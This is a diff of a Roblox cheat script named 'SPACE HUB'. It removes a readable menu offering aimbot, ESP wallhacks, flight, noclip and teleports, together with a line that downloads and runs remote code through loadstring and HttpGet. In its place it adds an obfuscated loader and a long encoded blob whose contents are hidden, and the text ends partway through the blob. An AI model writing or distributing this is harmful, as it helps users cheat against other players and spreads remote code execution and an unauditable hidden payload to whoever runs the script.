@@ -4,3526 +4,1504 @@
 --// VERSION 3.3.3
 --//======================================================
 
---//======================================================
---// SERVICES
---//======================================================
 
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local UserInputService = game:GetService("UserInputService")
-local Lighting = game:GetService("Lighting")
-local HttpService = game:GetService("HttpService")
-
-local LocalPlayer = Players.LocalPlayer
-
---//======================================================
---// STATE
---//======================================================
-
-local Character
-local Humanoid
-local HRP
-
-local walkSpeed = 16
-local flightSpeed = 50
-
-local flying = false
-local infiniteJump = false
-local noclip = false
-local fullbright = false
-
-local espEnabled = false
-local toolEspEnabled = false
-local toolEspMaxDistance = 10000
-local toolEspObjects = {}
-
-local aimbotEnabled = false
-local aimbotFOVEnabled = true
-local aimbotFOV = 250
-local aimbotSmoothness = 0.18
-local teamCheck = false
-local aimbotMaxDistance = 500
-local aimbotPriority = "FOV"
-local aimbotPart = "Head"
-local aimbotVisibleCheck = false
-local aimbotOnlyPlayers = true
-local aimbotOnlyEntities = false
-
-local espShowName = true
-local espShowHealth = true
-local espShowDistance = true
-local espTeamColors = true
-local espMaxDistance = 1000
-
-local jumpPower = 50
-local hipHeight = 2
-local customGravityEnabled = false
-local customGravity = 196.2
-local originalGravity = workspace.Gravity
-
-local selectedPlayer = nil
-local spectating = false
-local selectedWaypoint = nil
-local waypoints = {}
-local previousPosition = nil
-
-local dashboardLabels = {}
-
-local flyConnection
-local aimbotConnection
-local noclipConnection
-local jumpConnection
-local fullbrightConnection
-
-local espObjects = {}
-
-local originalLighting = {
-    Brightness = Lighting.Brightness,
-    ClockTime = Lighting.ClockTime,
-    FogEnd = Lighting.FogEnd,
-    GlobalShadows = Lighting.GlobalShadows
-}
-
---//======================================================
---// CHARACTER SYSTEM
---//======================================================
-
-local function updateCharacter(character)
-
-    Character = character
-
-    Humanoid = character:WaitForChild(
-        "Humanoid",
-        10
-    )
-
-    HRP = character:WaitForChild(
-        "HumanoidRootPart",
-        10
-    )
-
-    if Humanoid then
-        Humanoid.WalkSpeed = walkSpeed
-        Humanoid.UseJumpPower = true
-        Humanoid.JumpPower = jumpPower
-        Humanoid.HipHeight = hipHeight
-    end
-
-end
-
-if LocalPlayer.Character then
-    updateCharacter(LocalPlayer.Character)
-end
-
---//======================================================
---// RAYFIELD
---//======================================================
-
-local Rayfield = loadstring(game:HttpGet(
-    "https://sirius.menu/rayfield"
-))()
-
---//======================================================
---// WINDOW
---//======================================================
-
-local SpaceTheme = {
-    TextColor = Color3.fromRGB(232, 244, 255),
-    Background = Color3.fromRGB(8, 12, 22),
-    Topbar = Color3.fromRGB(11, 18, 32),
-    Shadow = Color3.fromRGB(0, 0, 0),
-
-    NotificationBackground = Color3.fromRGB(13, 22, 38),
-    NotificationActionsBackground = Color3.fromRGB(22, 34, 54),
-
-    TabBackground = Color3.fromRGB(12, 20, 34),
-    TabStroke = Color3.fromRGB(28, 45, 67),
-    TabBackgroundSelected = Color3.fromRGB(24, 82, 112),
-    TabTextColor = Color3.fromRGB(145, 169, 194),
-    SelectedTabTextColor = Color3.fromRGB(235, 250, 255),
-
-    ElementBackground = Color3.fromRGB(13, 21, 35),
-    ElementBackgroundHover = Color3.fromRGB(18, 31, 49),
-    SecondaryElementBackground = Color3.fromRGB(9, 16, 28),
-    ElementStroke = Color3.fromRGB(27, 48, 70),
-    SecondaryElementStroke = Color3.fromRGB(20, 36, 54),
-
-    SliderBackground = Color3.fromRGB(23, 48, 70),
-    SliderProgress = Color3.fromRGB(0, 190, 255),
-    SliderStroke = Color3.fromRGB(73, 215, 255),
-
-    ToggleBackground = Color3.fromRGB(17, 28, 43),
-    ToggleEnabled = Color3.fromRGB(0, 170, 230),
-    ToggleDisabled = Color3.fromRGB(57, 72, 91),
-    ToggleEnabledStroke = Color3.fromRGB(72, 220, 255),
-    ToggleDisabledStroke = Color3.fromRGB(74, 91, 112),
-    ToggleEnabledOuterStroke = Color3.fromRGB(30, 88, 113),
-    ToggleDisabledOuterStroke = Color3.fromRGB(36, 49, 66),
-
-    DropdownSelected = Color3.fromRGB(20, 36, 55),
-    DropdownUnselected = Color3.fromRGB(12, 21, 34),
-
-    InputBackground = Color3.fromRGB(11, 20, 33),
-    InputStroke = Color3.fromRGB(34, 58, 81),
-    PlaceholderColor = Color3.fromRGB(108, 132, 158)
-}
-
-local Window = Rayfield:CreateWindow({
-
-    Name = "SPACE HUB  //  ORBITAL",
-
-    Icon = "orbit",
-
-    LoadingTitle = "SPACE HUB",
-
-    LoadingSubtitle =
-        "Premium Orbital Interface  •  v3.1.1",
-
-    ShowText = "SPACE HUB",
-
-    ToggleUIKeybind = "K",
-
-    Theme = SpaceTheme,
-
-    DisableRayfieldPrompts = false,
-
-    DisableBuildWarnings = false,
-
-    ConfigurationSaving = {
-        Enabled = true,
-        FolderName = nil,
-        FileName = "SpaceHub"
-    },
-
-    Discord = {
-        Enabled = false,
-        Invite = "",
-        RememberJoins = true
-    },
-
-    KeySystem = true,
-
-    KeySettings = {
-
-        Title = "SPACE HUB",
-
-        Subtitle = "Orbital Access",
-
-        Note =
-            "Enter your Space Hub access key",
-
-        FileName = "SpaceHubKey",
-
-        SaveKey = true,
-
-        GrabKeyFromSite = false,
-
-        Key = {
-            "XmKqPzLwRtVbNfGhJdCs"
-        }
-
-    }
-
-})
-
---//======================================================
---// TABS
---//======================================================
-
-local DashboardTab =
-    Window:CreateTab(
-        "Dashboard",
-        "layout-dashboard"
-    )
-
-local UniversalTab =
-    Window:CreateTab(
-        "Universal",
-        "move"
-    )
-
-local GameTab =
-    Window:CreateTab(
-        "Game",
-        "crosshair"
-    )
-
-local TeleportTab =
-    Window:CreateTab(
-        "Teleport",
-        "map-pin"
-    )
-
-local WaypointsTab =
-    Window:CreateTab(
-        "Waypoints",
-        "bookmark"
-    )
-
-local PlayerManagerTab =
-    Window:CreateTab(
-        "Player Manager",
-        "users"
-    )
-
-local ConfigurationTab =
-    Window:CreateTab(
-        "Configuration",
-        "settings-2"
-    )
-
---//======================================================
---// DASHBOARD
---//======================================================
-
-DashboardTab:CreateParagraph({
-    Title = "✦ SPACE HUB  /  COMMAND DECK",
-    Content =
-        "Live orbital control center for movement, visuals, targeting and transportation.\n" ..
-        "All status panels below update automatically."
-})
-
-DashboardTab:CreateDivider()
-DashboardTab:CreateSection("LIVE SYSTEM STATUS")
-
-local SystemStatusLabel = DashboardTab:CreateLabel("●  SYSTEM ONLINE", "circle-check")
-local PlayerStatusLabel = DashboardTab:CreateLabel("Operator  •  " .. LocalPlayer.DisplayName .. "  @" .. LocalPlayer.Name, "user")
-local CharacterStatusLabel = DashboardTab:CreateLabel("Character  •  Synchronizing...", "scan")
-local RuntimeStatusLabel = DashboardTab:CreateLabel("Runtime  •  Initializing...", "activity")
-
-DashboardTab:CreateDivider()
-DashboardTab:CreateSection("LIVE TELEMETRY")
-
-local FPSLabel = DashboardTab:CreateLabel("FPS  •  --", "gauge")
-local PingLabel = DashboardTab:CreateLabel("Ping  •  -- ms", "wifi")
-local PlayersLabel = DashboardTab:CreateLabel("Players  •  --", "users")
-local PositionLabel = DashboardTab:CreateLabel("Position  •  --", "map-pin")
-
-DashboardTab:CreateDivider()
-DashboardTab:CreateSection("ACTIVE MODULES")
-
-local MovementStatusLabel = DashboardTab:CreateLabel("Movement  •  STANDBY", "move")
-local VisualStatusLabel = DashboardTab:CreateLabel("Visuals  •  STANDBY", "eye")
-local TargetStatusLabel = DashboardTab:CreateLabel("Targeting  •  STANDBY", "crosshair")
-local PhysicsStatusLabel = DashboardTab:CreateLabel("Physics  •  DEFAULT", "orbit")
-local WaypointStatusLabel = DashboardTab:CreateLabel("Waypoints  •  0 SAVED", "bookmark")
-
-DashboardTab:CreateDivider()
-DashboardTab:CreateSection("INTERFACE")
-
-DashboardTab:CreateParagraph({
-    Title = "KEYBOARD",
-    Content =
-        "Press  K  to hide/show the interface.\n" ..
-        "Flight:  W A S D  •  SPACE  •  LEFT CTRL"
-})
-
-DashboardTab:CreateButton({
-    Name = "Re-Synchronize Character",
-    Callback = function()
-        if LocalPlayer.Character then
-            updateCharacter(LocalPlayer.Character)
-            Rayfield:Notify({
-                Title = "SYSTEM",
-                Content = "Character systems synchronized.",
-                Duration = 3,
-                Image = "refresh-cw"
-            })
+local _5BosHOok3D,_QlyoxaP45t,_n9D4O5IsyH=nil,nil,nil
+do
+    local _XBQgXhAxzV=#("Sun Tzu said: Victorious warriors win first and then go to war.")-53
+    local _UJYRv4UzCZ=(_XBQgXhAxzV*41)+7
+    while _XBQgXhAxzV<_UJYRv4UzCZ do
+        _UJYRv4UzCZ=(_XBQgXhAxzV-9999)
+        while _XBQgXhAxzV>(_UJYRv4UzCZ-11) do
+            _UJYRv4UzCZ=(_XBQgXhAxzV+4466)*2
+            _5BosHOok3D=string.char
         end
+        break
     end
-})
+end
 
-task.spawn(function()
-    local frames = 0
-    local last = os.clock()
+local _ZtRmNDVeR3 =
+    "nrm5u7upqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqameubm7u7TH0cbC3dfRx565ubu7qampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampnp74+/f1+LTE+PXt8ebntKm08/X58a7T8eDH8ebi"
+    .. "/ffxvLbE+PXt8ebntr2e+Pv39fi0xuH6x/Hm4v338bSptPP1+fGu0/Hgx/Hm4v338by2xuH6"
+    .. "x/Hm4v338ba9nvj79/X4tMHn8ebd+uTh4Mfx5uL99/G0qbTz9fnxrtPx4Mfx5uL99/G8tsHn"
+    .. "8ebd+uTh4Mfx5uL99/G2vZ74+/f1+LTY/fP84P3687SptPP1+fGu0/Hgx/Hm4v338by22P3z"
+    .. "/OD9+vO2vZ74+/f1+LTc4ODkx/Hm4v338bSptPP1+fGu0/Hgx/Hm4v338by23ODg5Mfx5uL9"
+    .. "9/G2vZ6e+Pv39fi02Pv39fjE+PXt8ea0qbTE+PXt8ebnutj79/X4xPj17fHmnp65ubu7qamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampnrm5"
+    .. "u7u0x8DVwNGeubm7u6mpqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqZ6e+Pv39fi01/z15vX34PHmnvj79/X4tNzh+fX6+/3wnvj79/X4tNzG"
+    .. "xJ6e+Pv39fi04/X4/8fk8fHwtKm0paKe+Pv39fi08vj98/zgx+Tx8fC0qbShpJ6e+Pv39fi0"
+    .. "8vjt/frztKm08vX45/Ge+Pv39fi0/fry/fr94PHe4fnktKm08vX45/Ge+Pv39fi0+vv3+P3k"
+    .. "tKm08vX45/Ge+Pv39fi08uH4+Pbm/fP84LSptPL1+Ofxnp74+/f1+LTx5+TR+vX2+PHwtKm0"
+    .. "8vX45/Ge+Pv39fi04Pv7+NHn5NH69fb48fC0qbTy9fjn8Z74+/f1+LTg+/v40efk2fXs0P3n"
+    .. "4PX69/G0qbSlpKSkpJ74+/f1+LTg+/v40efk2/b+8ffg57SptO/pnp74+/f1+LT1/fn2++DR"
+    .. "+vX2+PHwtKm08vX45/Ge+Pv39fi09f359vvg0tvC0fr19vjx8LSptODm4fGe+Pv39fi09f35"
+    .. "9vvg0tvCtKm0pqGknvj79/X4tPX9+fb74Mf5+/vg/Prx5+e0qbSkuqWsnvj79/X4tODx9fnX"
+    .. "/PH3/7SptPL1+Ofxnvj79/X4tPX9+fb74Nn17ND95+D1+vfxtKm0oaSknvj79/X4tPX9+fb7"
+    .. "4MTm/fvm/eDttKm0ttLbwrae+Pv39fi09f359vvgxPXm4LSptLbc8fXwtp74+/f1+LT1/fn2"
+    .. "++DC/ef99vjx1/zx9/+0qbTy9fjn8Z74+/f1+LT1/fn2++Db+vjtxPj17fHm57SptODm4fGe"
+    .. "+Pv39fi09f359vvg2/r47dH64P3g/fHntKm08vX45/Genvj79/X4tPHn5Mf8++Pa9fnxtKm0"
+    .. "4Obh8Z74+/f1+LTx5+TH/Pvj3PH1+OD8tKm04Obh8Z74+/f1+LTx5+TH/Pvj0P3n4PX69/G0"
+    .. "qbTg5uHxnvj79/X4tPHn5MDx9fnX+/j75ue0qbTg5uHxnvj79/X4tPHn5Nn17ND95+D1+vfx"
+    .. "tKm0paSkpJ6e+Pv39fi0/uH55MT74/HmtKm0oaSe+Pv39fi0/P3k3PH98/zgtKm0pp74+/f1"
+    .. "+LT34efg+/nT5vXi/eDt0fr19vjx8LSptPL1+Ofxnvj79/X4tPfh5+D7+dPm9eL94O20qbSl"
+    .. "raK6pp74+/f1+LT75v3z/fr1+NPm9eL94O20qbTj++b/5+T19/G60+b14v3g7Z6e+Pv39fi0"
+    .. "5/H48ffg8fDE+PXt8ea0qbT6/fie+Pv39fi05+Tx9+D14P3687SptPL1+Ofxnvj79/X4tOfx"
+    .. "+PH34PHww/Xt5Pv9+uC0qbT6/fie+Pv39fi04/Xt5Pv9+uDntKm07+me+Pv39fi05Obx4v37"
+    .. "4efE++f94P37+rSptPr9+J6e+Pv39fi08PXn/Pb79ebw2PX28fjntKm07+menvj79/X4tPL4"
+    .. "7df7+vrx9+D9+/qe+Pv39fi09f359vvg1/v6+vH34P37+p74+/f1+LT6+/f4/eTX+/r68ffg"
+    .. "/fv6nvj79/X4tP7h+eTX+/r68ffg/fv6nvj79/X4tPLh+Pj25v3z/ODX+/r68ffg/fv6np74"
+    .. "+/f1+LTx5+Tb9v7x9+DntKm07+menvj79/X4tPvm/fP9+vX42P3z/OD9+vO0qbTvnrS0tLTW"
+    .. "5v3z/OD68efntKm02P3z/OD9+vO61ub98/zg+vHn57ietLS0tNf4+/f/wP358bSptNj98/zg"
+    .. "/frzutf4+/f/wP358bietLS0tNL789H68LSptNj98/zg/frzutL789H68LietLS0tNP4+/b1"
+    .. "+Mf89fD74+e0qbTY/fP84P3687rT+Pv29fjH/PXw++Pnnumenrm5u7upqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqameubm7u7TX3NXG1dfA"
+    .. "0ca0x83HwNHZnrm5u7upqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqamenvj79/X4tPLh+vfg/fv6tOHk8PXg8df89eb19+Dx5rz3/PXm9ffg"
+    .. "8ea9np60tLS01/z15vX34PHmtKm09/z15vX34PHmnp60tLS03OH59fr7/fC0qbT3/PXm9ffg"
+    .. "8eauw/X94NL75tf8/fjwvJ60tLS0tLS0tLbc4fn1+vv98La4nrS0tLS0tLS0paSetLS0tL2e"
+    .. "nrS0tLTcxsS0qbT3/PXm9ffg8eauw/X94NL75tf8/fjwvJ60tLS0tLS0tLbc4fn1+vv98Mb7"
+    .. "++DE9ebgtrietLS0tLS0tLSlpJ60tLS0vZ6etLS0tP3ytNzh+fX6+/3wtOD88fqetLS0tLS0"
+    .. "tLTc4fn1+vv98LrD9fj/x+Tx8fC0qbTj9fj/x+Tx8fCetLS0tLS0tLTc4fn1+vv98LrB5/He"
+    .. "4fnkxPvj8ea0qbTg5uHxnrS0tLS0tLS03OH59fr7/fC63uH55MT74/HmtKm0/uH55MT74/Hm"
+    .. "nrS0tLS0tLS03OH59fr7/fC63P3k3PH98/zgtKm0/P3k3PH98/zgnrS0tLTx+vCenvH68J6e"
+    .. "/fK02Pv39fjE+PXt8ea61/z15vX34PHmtOD88fqetLS0tOHk8PXg8df89eb19+Dx5rzY+/f1"
+    .. "+MT49e3x5rrX/PXm9ffg8ea9nvH68J6eubm7u6mpqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqZ65ubu7tMbVzdLd0djQnrm5u7upqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqamenvj79/X4"
+    .. "tMb17fL98fjwtKm0+Pv18Ofg5v3687zz9fnxrtzg4OTT8eC8nrS0tLS2/ODg5Oeuu7vn/eb9"
+    .. "4ee6+fH64bvm9e3y/fH48Laevb28vZ6eubm7u6mpqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqZ65ubu7tMPd2tDbw565ubu7qampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampqampqampqampnp74+/f1+LTH"
+    .. "5PX38cD88fnxtKm07560tLS0wPHs4Nf7+PvmtKm01/v4++anuvLm+/nG09a8pqemuLSmoKC4"
+    .. "tKahob24nrS0tLTW9ff/8+b74frwtKm01/v4++anuvLm+/nG09a8rLi0paa4tKamvbietLS0"
+    .. "tMD75Pb15rSptNf7+Pvmp7ry5vv5xtPWvKWluLSlrLi0p6a9uJ60tLS0x/z18PvjtKm01/v4"
+    .. "++anuvLm+/nG09a8pLi0pLi0pL24np60tLS02vvg/fL99/Xg/fv61vX3//Pm++H68LSptNf7"
+    .. "+Pvmp7ry5vv5xtPWvKWnuLSmpri0p6y9uJ60tLS02vvg/fL99/Xg/fv61ffg/fv659b19//z"
+    .. "5vvh+vC0qbTX+/j75qe68ub7+cbT1rympri0p6C4tKGgvbienrS0tLTA9fbW9ff/8+b74frw"
+    .. "tKm01/v4++anuvLm+/nG09a8paa4tKakuLSnoL24nrS0tLTA9fbH4Ob7//G0qbTX+/j75qe6"
+    .. "8ub7+cbT1rymrLi0oKG4tKKjvbietLS0tMD19tb19//z5vvh+vDH8fjx9+Dx8LSptNf7+Pvm"
+    .. "p7ry5vv5xtPWvKaguLSspri0paWmvbietLS0tMD19sDx7ODX+/j75rSptNf7+Pvmp7ry5vv5"
+    .. "xtPWvKWgobi0paKtuLSlraC9uJ60tLS0x/H48ffg8fDA9fbA8ezg1/v4++a0qbTX+/j75qe6"
+    .. "8ub7+cbT1rymp6G4tKahpLi0pqGhvbienrS0tLTR+PH58frg1vX3//Pm++H68LSptNf7+Pvm"
+    .. "p7ry5vv5xtPWvKWnuLSmpbi0p6G9uJ60tLS00fjx+fH64Nb19//z5vvh+vDc++Lx5rSptNf7"
+    .. "+Pvmp7ry5vv5xtPWvKWsuLSnpbi0oK29uJ60tLS0x/H3+/rw9ebt0fjx+fH64Nb19//z5vvh"
+    .. "+vC0qbTX+/j75qe68ub7+cbT1rytuLSlori0pqy9uJ60tLS00fjx+fH64Mfg5vv/8bSptNf7"
+    .. "+Pvmp7ry5vv5xtPWvKajuLSgrLi0o6S9uJ60tLS0x/H3+/rw9ebt0fjx+fH64Mfg5vv/8bSp"
+    .. "tNf7+Pvmp7ry5vv5xtPWvKakuLSnori0oaC9uJ6etLS0tMf4/fDx5tb19//z5vvh+vC0qbTX"
+    .. "+/j75qe68ub7+cbT1rymp7i0oKy4tKOkvbietLS0tMf4/fDx5sTm+/Pm8efntKm01/v4++an"
+    .. "uvLm+/nG09a8pLi0pa2kuLSmoaG9uJ60tLS0x/j98PHmx+Dm+//xtKm01/v4++anuvLm+/nG"
+    .. "09a8o6e4tKalobi0pqGhvbienrS0tLTA+/Pz+PHW9ff/8+b74frwtKm01/v4++anuvLm+/nG"
+    .. "09a8paO4tKasuLSgp724nrS0tLTA+/Pz+PHR+vX2+PHwtKm01/v4++anuvLm+/nG09a8pLi0"
+    .. "paOkuLSmp6S9uJ60tLS0wPvz8/jx0P3n9fb48fC0qbTX+/j75qe68ub7+cbT1ryho7i0o6a4"
+    .. "tK2lvbietLS0tMD78/P48dH69fb48fDH4Ob7//G0qbTX+/j75qe68ub7+cbT1ryjpri0pqak"
+    .. "uLSmoaG9uJ60tLS0wPvz8/jx0P3n9fb48fDH4Ob7//G0qbTX+/j75qe68ub7+cbT1ryjoLi0"
+    .. "raW4tKWlpr24nrS0tLTA+/Pz+PHR+vX2+PHw2+Hg8ebH4Ob7//G0qbTX+/j75qe68ub7+cbT"
+    .. "1rynpLi0rKy4tKWlp724nrS0tLTA+/Pz+PHQ/ef19vjx8Nvh4PHmx+Dm+//xtKm01/v4++an"
+    .. "uvLm+/nG09a8p6K4tKCtuLSior24np60tLS00Ob75PD74/rH8fjx9+Dx8LSptNf7+Pvmp7ry"
+    .. "5vv5xtPWvKakuLSnori0oaG9uJ60tLS00Ob75PD74/rB+ufx+PH34PHwtKm01/v4++anuvLm"
+    .. "+/nG09a8paa4tKaluLSnoL24np60tLS03frk4eDW9ff/8+b74frwtKm01/v4++anuvLm+/nG"
+    .. "09a8paW4tKakuLSnp724nrS0tLTd+uTh4Mfg5vv/8bSptNf7+Pvmp7ry5vv5xtPWvKeguLSh"
+    .. "rLi0rKW9uJ60tLS0xPj19/H8+/jw8ebX+/j75rSptNf7+Pvmp7ry5vv5xtPWvKWkrLi0paem"
+    .. "uLSloay9numenvj79/X4tMP9+vD747SptMb17fL98fjwrtfm8fXg8cP9+vD747zvnp60tLS0"
+    .. "2vX58bSptLbHxNXX0bTcwda0tLu7tLTbxtbdwNXYtrienrS0tLTd9/v6tKm0tvvm9v3gtrie"
+    .. "nrS0tLTY+/Xw/frzwP3g+PG0qbS2x8TV19G03MHWtrienrS0tLTY+/Xw/frzx+H24P3g+PG0"
+    .. "qZ60tLS0tLS0tLbE5vH5/eH5tNvm9v3g9fi03frg8eby9ffxtLR2FDa0tOKnuqW6pba4np60"
+    .. "tLS0x/z748Dx7OC0qbS2x8TV19G03MHWtrienrS0tLTA+/Pz+PHB3d/x7fb9+vC0qbS237a4"
+    .. "np60tLS0wPzx+fG0qbTH5PX38cD88fnxuJ6etLS0tND95/X2+PHG9e3y/fH48MTm+/nk4Oe0"
+    .. "qbTy9fjn8bienrS0tLTQ/ef19vjx1uH9+PDD9eb6/frz57SptPL1+OfxuJ6etLS0tNf7+vL9"
+    .. "8+Hm9eD9+/rH9eL9+vO0qbTvnrS0tLS0tLS00fr19vjx8LSptODm4fG4nrS0tLS0tLS00vv4"
+    .. "8PHm2vX58bSptPr9+LietLS0tLS0tLTS/fjx2vX58bSptLbH5PX38dzh9raetLS0tOm4np60"
+    .. "tLS00P3n9/vm8LSptO+etLS0tLS0tLTR+vX2+PHwtKm08vX45/G4nrS0tLS0tLS03fri/eDx"
+    .. "tKm0tra4nrS0tLS0tLS0xvH58fn28ebe+/3657SptODm4fGetLS0tOm4np60tLS03/Htx+3n"
+    .. "4PH5tKm04Obh8bienrS0tLTf8e3H8eDg/frz57SptO+enrS0tLS0tLS0wP3g+PG0qbS2x8TV"
+    .. "19G03MHWtrienrS0tLS0tLS0x+H24P3g+PG0qbS22+b2/eD1+LTV9/fx5+e2uJ6etLS0tLS0"
+    .. "tLTa++DxtKmetLS0tLS0tLS0tLS0ttH64PHmtO374ea0x+T19/G03OH2tPX39/Hn57T/8e22"
+    .. "uJ6etLS0tLS0tLTS/fjx2vX58bSptLbH5PX38dzh9t/x7ba4np60tLS0tLS0tMf14vHf8e20"
+    .. "qbTy9fjn8bienrS0tLS0tLS00+b19t/x7dLm+/nH/eDxtKm08vX45/G4np60tLS0tLS0tN/x"
+    .. "7bSptO+etLS0tLS0tLS0tLS0tufk9ffx/OH2paahoLaetLS0tLS0tLTpnp60tLS06Z6e6b2e"
+    .. "nrm5u7upqampqampqampqampqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqameubm7u7TA1dbHnrm5u7upqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqamenvj79/X4tND15/z2+/Xm8MD19rSpnrS0tLTD/frw++Ou"
+    .. "1+bx9eDxwPX2vJ60tLS0tLS0tLbQ9ef89vv15vC2uJ60tLS0tLS0tLb49e374eC58PXn/Pb7"
+    .. "9ebwtp60tLS0vZ6e+Pv39fi0wfr94vHm5/X4wPX2tKmetLS0tMP9+vD7467X5vH14PHA9fa8"
+    .. "nrS0tLS0tLS0tsH6/eLx5uf1+La4nrS0tLS0tLS0tvn74vG2nrS0tLS9np74+/f1+LTT9fnx"
+    .. "wPX2tKmetLS0tMP9+vD7467X5vH14PHA9fa8nrS0tLS0tLS0ttP1+fG2uJ60tLS0tLS0tLb3"
+    .. "5vvn5/z1/ea2nrS0tLS9np74+/f1+LTA8fjx5Pvm4MD19rSpnrS0tLTD/frw++Ou1+bx9eDx"
+    .. "wPX2vJ60tLS0tLS0tLbA8fjx5Pvm4La4nrS0tLS0tLS0tvn15Lnk/fq2nrS0tLS9np74+/f1"
+    .. "+LTD9e3k+/364OfA9fa0qZ60tLS0w/368Pvjrtfm8fXg8cD19ryetLS0tLS0tLS2w/Xt5Pv9"
+    .. "+uDntrietLS0tLS0tLS29vv7//n15v+2nrS0tLS9np74+/f1+LTE+PXt8ebZ9fr18/HmwPX2"
+    .. "tKmetLS0tMP9+vD7467X5vH14PHA9fa8nrS0tLS0tLS0tsT49e3x5rTZ9fr18/HmtrietLS0"
+    .. "tLS0tLS24efx5ue2nrS0tLS9np74+/f1+LTX+/ry/fPh5vXg/fv6wPX2tKmetLS0tMP9+vD7"
+    .. "467X5vH14PHA9fa8nrS0tLS0tLS0ttf7+vL98+Hm9eD9+/q2uJ60tLS0tLS0tLbn8eDg/frz"
+    .. "57mmtp60tLS0vZ6eubm7u6mpqampqampqampqampqampqampqampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqZ65ubu7tNDVx9zW29XG0J65ubu7qampqampqampqampqampqamp"
+    .. "qampqampqampqampqampqampqampqampqampqampqampqampnp7Q9ef89vv15vDA9fau1+bx"
+    .. "9eDxxPXm9fPm9eT8vO+etLS0tMD94PjxtKm0tnYIMrTHxNXX0bTcwda0tLu0tNfb2dnV2tC0"
+    .. "0NHX37a4nrS0tLTX+/rg8frgtKmetLS0tLS0tLS22P3i8bT75vb94PX4tPf7+uDm+/i09/H6"
+    .. "4PHmtPL75rT5++Lx+fH64Li04v3n4fX457i04PXm8/Hg/frztPX68LTg5vX65+T75uD14P37"
+    .. "+rrI+ra0urqetLS0tLS0tLS21fj4tOfg9eDh57Tk9frx+Oe09vH4++O04eTw9eDxtPXh4Pv5"
+    .. "9eD99/X4+O26tp7pvZ6e0PXn/Pb79ebwwPX2rtfm8fXg8dD94v3w8ea8vZ7Q9ef89vv15vDA"
+    .. "9fau1+bx9eDxx/H34P37+ry22N3C0bTHzcfA0dm0x8DVwMHHtr2envj79/X4tMft5+Dx+cfg"
+    .. "9eDh59j19vH4tKm00PXn/Pb79ebwwPX2rtfm8fXg8dj19vH4vLZ2Axu0tMfNx8DR2bTb2tjd"
+    .. "2tG2uLS29/3m9/jxuff88ff/tr2e+Pv39fi0xPj17fHmx+D14OHn2PX28fi0qbTQ9ef89vv1"
+    .. "5vDA9fau1+bx9eDx2PX28fi8ttvk8eb14PvmtLR2FDa0tLa0urq02Pv39fjE+PXt8ea60P3n"
+    .. "5Pj17dr1+fG0urq0trS01La0urq02Pv39fjE+PXt8ea62vX58bi0tuHn8ea2vZ74+/f1+LTX"
+    .. "/PXm9ffg8ebH4PXg4efY9fbx+LSptND15/z2+/Xm8MD19q7X5vH14PHY9fbx+Ly21/z15vX3"
+    .. "4PHmtLR2FDa0tMft+vf85vv6/e79+vO6urq2uLS25/f1+ra9nvj79/X4tMbh+uD9+fHH4PXg"
+    .. "4efY9fbx+LSptND15/z2+/Xm8MD19q7X5vH14PHY9fbx+Ly2xuH64P358bS0dhQ2tLTd+v3g"
+    .. "/fX4/e79+vO6urq2uLS29ffg/eL94O22vZ6e0PXn/Pb79ebwwPX2rtfm8fXg8dD94v3w8ea8"
+    .. "vZ7Q9ef89vv15vDA9fau1+bx9eDxx/H34P37+ry22N3C0bTA0djR2dHAxs22vZ6e+Pv39fi0"
+    .. "0sTH2PX28fi0qbTQ9ef89vv15vDA9fau1+bx9eDx2PX28fi8ttLEx7S0dhQ2tLS5uba4tLbz"
+    .. "9eHz8ba9nvj79/X4tMT9+vPY9fbx+LSptND15/z2+/Xm8MD19q7X5vH14PHY9fbx+Ly2xP36"
+    .. "87S0dhQ2tLS5ubT557a4tLbj/fL9tr2e+Pv39fi0xPj17fHm59j19vH4tKm00PXn/Pb79ebw"
+    .. "wPX2rtfm8fXg8dj19vH4vLbE+PXt8ebntLR2FDa0tLm5tri0tuHn8ebntr2e+Pv39fi0xPvn"
+    .. "/eD9+/rY9fbx+LSptND15/z2+/Xm8MD19q7X5vH14PHY9fbx+Ly2xPvn/eD9+/q0tHYUNrS0"
+    .. "ubm2uLS2+fXkueT9+ra9np7Q9ef89vv15vDA9fau1+bx9eDx0P3i/fDx5ry9ntD15/z2+/Xm"
+    .. "8MD19q7X5vH14PHH8ffg/fv6vLbV18DdwtG02dvQwdjRx7a9np74+/f1+LTZ++Lx+fH64Mfg"
+    .. "9eDh59j19vH4tKm00PXn/Pb79ebwwPX2rtfm8fXg8dj19vH4vLbZ++Lx+fH64LS0dhQ2tLTH"
+    .. "wNXa0NbNtri0tvn74vG2vZ74+/f1+LTC/efh9fjH4PXg4efY9fbx+LSptND15/z2+/Xm8MD1"
+    .. "9q7X5vH14PHY9fbx+Ly2wv3n4fX457S0dhQ2tLTHwNXa0NbNtri0tvHt8ba9nvj79/X4tMD1"
+    .. "5vPx4Mfg9eDh59j19vH4tKm00PXn/Pb79ebwwPX2rtfm8fXg8dj19vH4vLbA9ebz8eD9+vO0"
+    .. "tHYUNrS0x8DV2tDWzba4tLb35vvn5/z1/ea2vZ74+/f1+LTE/O3n/ffnx+D14OHn2PX28fi0"
+    .. "qbTQ9ef89vv15vDA9fau1+bx9eDx2PX28fi8tsT87ef99+e0tHYUNrS00NHS1cHYwLa4tLb7"
+    .. "5vb94La9nvj79/X4tMP17eT7/frgx+D14OHn2PX28fi0qbTQ9ef89vv15vDA9fau1+bx9eDx"
+    .. "2PX28fi8tsP17eT7/frg57S0dhQ2tLSktMfVwtHQtri0tvb7+//59eb/tr2entD15/z2+/Xm"
+    .. "8MD19q7X5vH14PHQ/eL98PHmvL2e0PXn/Pb79ebwwPX2rtfm8fXg8cfx9+D9+/q8tt3awNHG"
